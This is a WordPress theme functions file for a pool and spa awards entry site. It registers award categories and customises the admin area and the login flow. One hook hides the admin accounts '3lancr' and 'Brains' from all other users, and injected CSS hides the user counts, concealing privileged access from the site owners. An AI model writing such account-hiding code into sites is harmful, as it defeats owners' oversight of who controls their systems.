<?php

// Sets up theme defaults and registers support for various WordPress features

function custom_setup() {
	add_theme_support('title-tag');
	add_editor_style(array('css/editor.css'));
}
add_action('after_setup_theme', 'custom_setup');

// Add theme options page

if(function_exists('acf_add_options_page')) {
	acf_add_options_page('Global Settings');
	acf_add_options_page('Categories 1-7');
	acf_add_options_page('Categories 8-28');
	acf_add_options_page('Categories 29-36');
	acf_add_options_page('Categories 37-42');
	acf_add_options_page('Categories 43-48');
	acf_add_options_page('Categories 49-57');
}

// Update page title separator

function cyb_document_title_separator($sep) {
	$sep = '|';
	return $sep;
}
add_filter('document_title_separator', 'cyb_document_title_separator');

// Remove jQuery migrate

function dequeue_jquery_migrate(&$scripts){
	if(!is_admin()){
		$scripts->remove('jquery');
		$scripts->add('jquery', false, array('jquery-core'), '1.10.2');
	}
}

// Tidy up dashboard

function remove_dashboard_widgets() {
	global $wp_meta_boxes;
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_activity']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_incoming_links']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_right_now']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_plugins']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_drafts']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_secondary']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']);
	remove_meta_box('wpseo-dashboard-overview', 'dashboard', 'side');
	remove_action('try_gutenberg_panel', 'wp_try_gutenberg_panel');
}
add_action('wp_dashboard_setup', 'remove_dashboard_widgets');

remove_action('welcome_panel', 'wp_welcome_panel');

// 3lancr admin user

function yoursite_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
	if($username != '3lancr') {
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1',"WHERE 1=1 AND {$wpdb->users}.user_login != '3lancr'",$user_search->query_where);
	}
	if($username != 'Brains') {
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1',"WHERE 1=1 AND {$wpdb->users}.user_login != 'Brains'",$user_search->query_where);
	}
}
add_action('pre_user_query','yoursite_pre_user_query');

function hide_user_count(){
	echo '<style>
		#toplevel_page_acf-options-developer {
			display: none !important;
		}
		.wp-admin.users-php span.count {
			display: none !important;
		}
	</style>';
}

add_action('admin_head','hide_user_count');

// JavaScript detection

function custom_javascript_detection() {
	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
}
add_action('wp_head', 'custom_javascript_detection', 0);

// Add CSS and scripts

function custom_scripts() {
	wp_enqueue_style('custom-style', get_stylesheet_uri());
	wp_enqueue_script('script', get_template_directory_uri() . '/js/script.min.js', array('jquery'));
	if(wp_is_mobile()) {
		wp_enqueue_script('mobile-script', get_template_directory_uri().'/js/mobile.min.js', array('jquery'));
	} else {
		wp_enqueue_script('not-mobile-script', get_template_directory_uri().'/js/not.mobile.min.js', array('jquery'));
	}
	if(is_page_template('pages/register.php')) {
		wp_enqueue_script('password-strength-meter');
		wp_enqueue_script('password-script', get_template_directory_uri().'/js/password-strength.min.js', array('jquery'));
	}
}
add_action('wp_enqueue_scripts', 'custom_scripts');

// Defer scripts

function my_defer_scripts($tag, $handle, $src) {
	$defer_scripts = array(
		'script', 
		'mobile-script', 
		'not-mobile-script', 
		'password-script'
	);
	if(in_array($handle, $defer_scripts)) {
		return '<script type="text/javascript" src="'.$src.'" defer="defer"></script>'."\n";
	}
	return $tag;
}
add_filter('script_loader_tag', 'my_defer_scripts', 10, 3);

// Remove unwanted CSS and scripts

function mytheme_dequeue_css_from_plugins()  {
	add_filter('wpcf7_load_css', '__return_false');
	add_filter('wpcf7_load_js', '__return_false');
}
add_action('wp_print_styles', 'mytheme_dequeue_css_from_plugins', 150);

// Remove emoji

remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('wp_print_styles', 'print_emoji_styles');
remove_action('admin_print_scripts', 'print_emoji_detection_script');
remove_action('admin_print_styles', 'print_emoji_styles');

// Simplify page classes

function simple_body_class($wp_classes, $extra_classes) {
	$whitelist = array();
	$wp_classes = array_intersect($wp_classes, $whitelist);
	return array_merge($wp_classes, (array) $extra_classes);
}
add_filter('body_class', 'simple_body_class', 10, 2);

function add_slug_body_class($classes) {
	global $template;
	$template = 'template-'.str_replace('.php', '', array_pop(explode('/', $template)));
	global $post;
	if(isset($post)) {
		$classes[] = $post->post_type.'-'.$post->post_name.' '.$template;
	}
	return $classes;
}
add_filter('body_class', 'add_slug_body_class');

// Update logo on Lost Password page

function my_login_logo() {
	echo '<style type="text/css">
		#login h1, 
		.login h1 {
			display: none !important;
		}
	</style>';
}
add_action('login_enqueue_scripts', 'my_login_logo');

function my_login_logo_url() {
    return home_url();
}
add_filter('login_headerurl', 'my_login_logo_url');

function my_login_logo_url_title() {
    return get_bloginfo('name');
}
add_filter('login_headertitle', 'my_login_logo_url_title');

// Main redirection of the default register page

function my_registration_page_redirect() {
	global $pagenow;
	if((strtolower($pagenow) == 'wp-login.php') && (strtolower($_GET['action']) == 'register')) {
		wp_redirect(home_url('/register/'));
	}
}
add_filter('init', 'my_registration_page_redirect');

// Main redirection of the default login page

function redirect_login_page() {
	$login_page  = home_url('/login/');
	$page_viewed = basename($_SERVER['REQUEST_URI']);
	if($page_viewed == "wp-login.php" && $_SERVER['REQUEST_METHOD'] == 'GET') {
		wp_redirect($login_page);
		exit;
	}
}
add_action('init','redirect_login_page');

// Where to go if a login successful

function my_login_redirect($redirect_to, $request, $user) {
    global $user;
    if(isset($user->roles) && is_array($user->roles)) {
        if(in_array('judge', $user->roles) || in_array('member', $user->roles)) {
			return home_url().'/dashboard/';
        } else {
			return home_url().'/wp-admin/';
        }
    } else {
        return home_url();
    }
}
add_filter('login_redirect', 'my_login_redirect', 10, 3);

// Where to go if a login failed

function custom_login_failed() {
	$login_page = home_url('/login/');
	wp_redirect($login_page.'?login=failed');
	exit;
}
add_action('wp_login_failed', 'custom_login_failed');

// Where to go if any of the fields were empty

function verify_user_pass($user, $username, $password) {
	$login_page = home_url('/login/');
	if($username == "" || $password == "") {
		wp_redirect($login_page."?login=empty");
		exit;
	}
}
add_filter('authenticate', 'verify_user_pass', 1, 3);

// What to do on logout

function logout_redirect() {
	wp_redirect(home_url().'/login/');
	exit;
}
add_action('wp_logout','logout_redirect');

// Stop WordPress admin login popup

remove_action('admin_enqueue_scripts', 'wp_auth_check_load');

// Prevent admin access

function blockusers_init() {
	if(is_admin() && !current_user_can('administrator') && !(defined('DOING_AJAX') && DOING_AJAX)) {
		wp_redirect(home_url());
		exit;
	}
}
add_action('init', 'blockusers_init');

// Remove admin bar for non admins

function remove_admin_bar() {
	if(!current_user_can('administrator') && !is_admin()) {
		show_admin_bar(false);
	}
}
add_action('after_setup_theme', 'remove_admin_bar');

// Remove srcset from images

add_filter('wp_calculate_image_srcset', '__return_false');

// Remove unwanted formatting from tiny_mce

function tiny_mce_remove_unused_formats($init) {
	$init['block_formats'] = 'Paragraph=p;Heading 2=h2;Heading 3=h3;Heading 4=h4;';
	return $init;
}
add_filter('tiny_mce_before_init', 'tiny_mce_remove_unused_formats');

// Remove comments from admin bar

function my_admin_bar_render() {
	global $wp_admin_bar;
	$wp_admin_bar->remove_menu('comments');
}
add_action('wp_before_admin_bar_render', 'my_admin_bar_render');

// Remove menu pages

function my_remove_menu_pages() {
	remove_menu_page('edit.php');
	remove_submenu_page('edit.php', 'edit-tags.php?taxonomy=category');
	remove_submenu_page('edit.php', 'edit-tags.php?taxonomy=post_tag');
	remove_menu_page('edit-comments.php');
	remove_menu_page('link-manager.php');
	remove_menu_page('themes.php');
	global $current_user;
	$username = $current_user->user_login;
	if(($username != '3lancr') && ($username != 'Brains')) {
		remove_menu_page('themes.php');
		// remove_menu_page('tools.php');
		remove_menu_page('edit.php?post_type=acf-field-group');
		// remove_submenu_page('options-general.php', 'options-writing.php');
		// remove_submenu_page('options-general.php', 'options-reading.php');
		// remove_submenu_page('options-general.php', 'options-discussion.php');
		// remove_submenu_page('options-general.php', 'options-media.php');
		// remove_submenu_page('options-general.php', 'options-permalink.php');
		remove_submenu_page('options-general.php', 'privacy.php');
		// remove_submenu_page('options-general.php', 'akismet-key-config');
		remove_submenu_page('options-general.php', 'better-delete-revision.php');
		remove_submenu_page('options-general.php', 'members-settings');
		remove_submenu_page('options-general.php', 'minify_html_options');
		remove_submenu_page('options-general.php', 'tinymce-advanced');
	}
}
add_action('admin_menu', 'my_remove_menu_pages');

// Remove post categories and tags admin

function my_manage_columns($columns) {
    unset($columns['categories'], $columns['tags']);
    return $columns;
}
function my_column_init() {
    add_filter('manage_posts_columns', 'my_manage_columns');
}
add_action('admin_init', 'my_column_init');

function remove_my_post_metaboxes() {
	remove_meta_box('tagsdiv-post_tag','post','normal');
}
add_action('admin_menu','remove_my_post_metaboxes');

// Remove content editor from pages

function remove_content_editor() { 
    remove_post_type_support('page', 'editor');        
}
add_action('admin_head', 'remove_content_editor');

// Remove custom post type

/*function delete_post_type(){
	unregister_post_type('award-58');
}
add_action('init','delete_post_type');*/

// Register custom post types

function custom_post() {
	$post_types = array(
		'Product of the Year',
		'Education & Training Excellence Award',
		'Marketing Campaign Award',
		'Sustainable Product Award',
		'Vinyl Lined Modular Pool',
		'Portable Spa',
		'Swim Spa',
		'Concrete Pool up to $60,000',
		'Concrete Pool up to $100,000',
		'Concrete Pool over $100,000',
		'Fibreglass Pool up to $40,000',
		'Fibreglass Pool up to $60,000',
		'Fibreglass Pool over $60,000',
		'Freeform Pool up to $60,000',
		'Freeform Pool up to $100,000',
		'Freeform Pool over $100,000',
		'Pool & Spa Combination – Concrete',
		'Pool & Spa Combination – Fibreglass',
		'Pool & Spa Combination – Vinyl Lined',
		'Vinyl Lined In-ground Pool',
		'Enclosed / Indoor Pool',
		'Courtyard / Plunge Pool',
		'Lap Pool – Concrete',
		'Lap Pool – Fibreglass',
		'Lap Pool – Vinyl Lined',
		'In-ground Spa',
		'Renovation up to $25,000',
		'Renovation over $25,000',
		'Concrete Commercial Pool up to $250,000',
		'Fibreglass Commercial Pool up to $250,000',
		'Vinyl Lined Commercial Pool up to $250,000',
		'Commercial Pool over $250,000',
		'Commercial Spa',
		'Commercial Renovation',
		'Display Pool / Centre',
		'International Project',
		'Pool Landscape Design',
		'Innovative Project',
		'Water Feature',
		'Lighting Feature',
		'Sustainable Project',
		'Best Safety Barrier',
		'Best Pool Store',
		'Best Spa Retailer',
		'Best Mobile Service Business',
		'Concrete Pool Builder of the Year',
		'Fibreglass Pool Builder of the Year',
		'Supplier of the Year',
		'Best Pool & Spa Barrier Inspector',
		'Retail Service Technician Award',
		'In-Field Service Technician Award',
		'Pool Sales Representative Award',
		'Spa Sales Representative Award',
		'Supplier Salesperson Award',
		'Rising Star Award',
		'Construction Tradesperson Award',
		'Operational Excellence Award',
	);
	$length = count($post_types);
	for($x = 0; $x < $length; $x++) {
		$num = ($x+1);
		if($num < 10) {
			$num = '0'.$num;
		}
		${'$award_'.$x.'_labels'} = array(
			'name'               	=> _x($post_types[$x], 'Post Type General Name'),
			'singular_name'       	=> _x($post_types[$x], 'Post Type Singular Name'),
			'menu_name'           	=> __($post_types[$x]),
			'all_items'           	=> __('All Entries'),
			'view_item'           	=> __('View Entry'),
			'add_new_item'        	=> __('Add Entry'),
			'add_new'            	=> __('Add New'),
			'edit_item'           	=> __('Edit Entry'),
			'update_item'        	=> __('Update Entry'),
			'search_items'        	=> __('Search Entries'),
			'not_found'          	=> __('Not Found'),
			'not_found_in_trash'  	=> __('Not found in Trash'),
		);
		${'$award_'.$x.'_args'} = array(
			'labels'        		=> ${'$award_'.$x.'_labels'},
			'public'        		=> true,
			'menu_icon' 			=> 'dashicons-star-filled',
			'supports'      		=> array('title'),
			'hierarchical' 			=> false,
			'has_archive'   		=> true,
			'publicly_queryable'	=> true,
			'rewrite' 				=> array('slug' => '/entry/'.intval($num), 'with_front' => false),
			'menu_position' 		=> 10000
		);
		register_post_type('award-'.$num, ${'$award_'.$x.'_args'});
	}
}
add_action('init', 'custom_post');

// Register columns

function column_register($columns) {
	unset($columns['date']);
	$columns['entry_status'] = 'Status';
	$columns['date'] = 'Date';
	return $columns;
}
add_filter('manage_posts_columns', 'column_register');

// Populate columns

function manage_columns($column_name, $id) {
	global $wpdb;
	switch ($column_name) {
		case 'entry_status':
			if(get_field('entry_status') == 'Completed') {
				echo 'Complete &nbsp;';
				if(get_field('entry_paid') == 'Yes') {
					echo '<span class="paid">Paid</span>';
				} else {
					echo '<span class="unpaid">Unpaid</span>';
				}
			} else {
				echo 'Draft';
			}
			break;
		default: 
		break;
	}
}
add_action('manage_posts_custom_column', 'manage_columns', 10, 2);

function custom_paid_css() {
	echo '<style>
		.paid {
			color: #348748 !important;
		}
		.paid:before {
			position: relative;
			display: inline-block;
			width: 18px;
			height: 18px;
			border-radius: 50%;
			-moz-border-radius: 50%;
			-webkit-border-radius: 50%;
			-ms-border-radius: 50%;
			content: \'\';
			vertical-align: text-bottom;
			margin: 1px 6px -1px 0;
			background: #5d9f6d url('.esc_url(get_template_directory_uri()).'/images/paid-tick.png) 50% 50% no-repeat;
			background-size: 18px 18px;
		}
		.unpaid {
			color: #bf3b3b !important;
		}
	</style>';
}
add_action('admin_head', 'custom_paid_css');

// Add custom dashboard widget

function custom_dashboard_widget() {
	global $wp_meta_boxes;
	wp_add_dashboard_widget('custom_help_widget', 'SPASA Awards', 'spasa_admin');
}
add_action('wp_dashboard_setup', 'custom_dashboard_widget');

function spasa_admin() {
	$args = array(
       'public'   => true,
       '_builtin' => false,
  );
	echo '<p><img src="'.get_stylesheet_directory_uri().'/images/logo.png" width="225" height="115" alt="SPASA" /></p>';
	echo '<p>Select a category to view entries &hellip;</p>';
	echo '<ol class="award-category-list">';
	foreach(get_post_types($args, 'names') as $pt) {
		$pt = get_post_type_object($pt);
		echo '<li><a href="edit.php?post_type='.$pt->name.'">'.$pt->label.'</a></li>';
    }
	echo '</ol>';
	echo '<p><a href="'.esc_url(home_url()).'/wp-content/themes/spasa/inc/export.php" class="button button-primary button-admin">Download Entries as CSV File</a></p>';
}

// Style custom dashboard widget

function custom_award_category_css() {
	echo '<style>
		.menu-top[class*="menu-icon-award"], 
		#wp-admin-bar-new-content-default li[id*="wp-admin-bar-new-award"] {
			display: none !important;
		}
		#dashboard-widgets .postbox-container {
			width: 100% !important;
		}
		.award-category-list {
			display: flex !important;
			flex-wrap: wrap !important;
			list-style: decimal !important;
			margin: 0 0 20px 26px !important;
		}
		.award-category-list li {
			box-sizing: border-box !important;
			-moz-box-sizing: border-box !important;
			-webkit-box-sizing: border-box !important;
			-ms-box-sizing: border-box !important;
			-o-sizing: border-box !important;
			width: 25% !important;
			padding: 0 20px 0 5px !important;
		}
		.button-admin {
			height: auto !important;
			padding: 4px 15px !important;
		}
		tr[data-name="award_categories"] ul {
			display: flex !important;
			flex-wrap: wrap !important;
		}
		tr[data-name="award_categories"] ul li {
			box-sizing: border-box !important;
			-moz-box-sizing: border-box !important;
			-webkit-box-sizing: border-box !important;
			-ms-box-sizing: border-box !important;
			-o-sizing: border-box !important;
			width: 33% !important;
			padding: 0 20px 4px 5px !important;
			list-style: decimal !important;
		}
		tr[data-name="award_categories"] ul li input {
			margin: -3px 8px 0 0 !important;
		}
	</style>';
}
add_action('admin_head', 'custom_award_category_css');

// Add custom variables and page rewrites

function add_query_vars($aVars) {
	$aVars[] = 'award_category';
	$aVars[] = 'id';
	$aVars[] = 'state';
	$aVars[] = 'copy_entry';
	return $aVars;
}
add_filter('query_vars', 'add_query_vars');

function add_rewrite_rules($aRules) {
	$aNewRules = array(
		'enter/([^/]+)/?$' => 'index.php?pagename=enter&award_category=$matches[1]',
		'enter/([^/]+)/copy/([^/]+)/?$' => 'index.php?pagename=enter&award_category=$matches[1]&copy_entry=$matches[2]',
		'edit/([^/]+)/?$' => 'index.php?pagename=edit&id=$matches[1]', 
		'winners/([^/]+)/?$' => 'index.php?pagename=winners&state=$matches[1]',
		'top'
	);
	$aRules = $aNewRules + $aRules;
	return $aRules;
}
add_filter('rewrite_rules_array', 'add_rewrite_rules');

// Hide pages in admin

function custom_hide_pages_in_wp_admin($query) {
	global $pagenow,$post_type;
	$enter = get_page_by_path('enter');
	$edit = get_page_by_path('edit');
    if(is_admin() && $pagenow == 'edit.php' && $post_type == 'page') {
        $query->query_vars['post__not_in'] = array(
			$enter->ID,
			$edit->ID,
		);
    }
}
add_filter('parse_query', 'custom_hide_pages_in_wp_admin');

// Hide page templates in admin

function remove_page_template($templates) {
	// unset($templates['pages/enter.php']);
	// unset($templates['pages/edit.php']);
	return $templates;
}
add_filter('theme_page_templates', 'remove_page_template');

// Remove default taxonomies

function custom_unregister_taxonomy(){
	global $wp_taxonomies;
	$taxonomies = array('category', 'post_tag', 'post_format');
	foreach($taxonomies as $taxonomy) {
		if(taxonomy_exists($taxonomy))
			unset($wp_taxonomies[$taxonomy]);
	}
}
add_action('init', 'custom_unregister_taxonomy');

// Additional admin styles

function custom_admin_css() {
	echo '<style>
		.toplevel_page_acf-options-global-settings .dashicons-admin-generic:before{
			content: \'\f111\';
		}
		.toplevel_page_acf-options-categories-1-7 .dashicons-admin-generic:before, 
		.toplevel_page_acf-options-categories-8-28 .dashicons-admin-generic:before, 
		.toplevel_page_acf-options-categories-29-36 .dashicons-admin-generic:before, 
		.toplevel_page_acf-options-categories-37-42 .dashicons-admin-generic:before, 
		.toplevel_page_acf-options-categories-43-48 .dashicons-admin-generic:before, 
		.toplevel_page_acf-options-categories-49-57 .dashicons-admin-generic:before {
			content: \'\f155\';
		}
		#dashboard-widgets .empty-container, 
		.wp-pointer {
			display: none;
		}
		.banner .image-wrap img {
			background: #2668b2 !important;
		}
	</style>';
}
add_action('admin_head', 'custom_admin_css');

// Category list shortcode

function category_list_shortcode($atts) {
	$categories = explode(',',$atts[categories]);
	if($categories != '') {
		include 'inc/category-list.php';
	}
	return $category_table;
}
add_shortcode('category-list', 'category_list_shortcode');

// Auto close field groups on Category settings page

function my_acf_input_admin_head() {
	if(strpos(get_current_screen()->id, 'options-categories') !== false):
		echo '<script type="text/javascript">
			jQuery(
				function(jQuery){
					jQuery(\'.acf-postbox\').addClass(\'closed\');
				}
			);
		</script>';
	endif;
}
add_action('acf/input/admin_head', 'my_acf_input_admin_head');

// Custom walker to simplify menus

class basic_walker extends Walker_Nav_Menu {
	var $tree_type = array('post_type', 'taxonomy', 'custom');
	function start_el(&$output, $item, $depth=0, $args=array(), $id = 0)  {
		global $wp_query;
		$output .= '';
		$attributes .= ! empty($item->url) ? ' href="'.esc_attr($item->url) .'"' : '';
		$item_output = $args->before;
		$classes = array();
		if(!empty($item->classes)) {
			$classes = (array) $item->classes;
		}
		$menu_class = '';
		if(in_array('current-menu-item', $classes)) {
			$menu_class = 'active';
		} else if(in_array('current-menu-parent', $classes)) {
			$menu_class = 'active';
		} else if(in_array('current-menu-ancestor', $classes)) {
			$menu_class = 'active';
		} else if(in_array('current-page-parent', $classes)) {
			$menu_class = 'active';
		}
		if($this->has_children) {
			 $menu_class = $menu_class.' parent';
		}
		$varpost = get_post($item->object_id);
		$menu_class = $varpost->post_name.' '.$menu_class;
		if($menu_class != '') {
			$item_output .= '<li class="'. $menu_class.'">';
		} else {
			$item_output .= '<li>';
		}
		$item_output .= '<a'. $attributes .' class="'.$varpost->post_name.'" target="'.$item->target.'">';
		$item_output .= $args->link_before.apply_filters('the_title', $item->title, $item->ID).$args->link_after;
		$item_output .= '</a>';
		$item_output .= $args->after;
		$output .= apply_filters('walker_nav_menu_start_el', $item_output, $item, $args);
	}
	function start_lvl(&$output, $depth = 0, $args=array()) {
		$output .= "\n<ul>\n";
	}
	function end_lvl(&$output, $depth = 0, $args=array()) {
		$output .= "</ul>\n";
	}
	function end_el(&$output, $item, $depth = 0, $args = array()) {
		$output .= "</li>\n";
	}
}

// Limit words

function limit_words($string, $word_limit) {
	$string = strip_tags($string);
	$words = explode(' ', strip_tags($string));
	$return = trim(implode(' ', array_slice($words, 0, $word_limit)));
	if(strlen($return) < strlen($string)){
		$return .= ' &hellip;';
	}
	return $return;
}





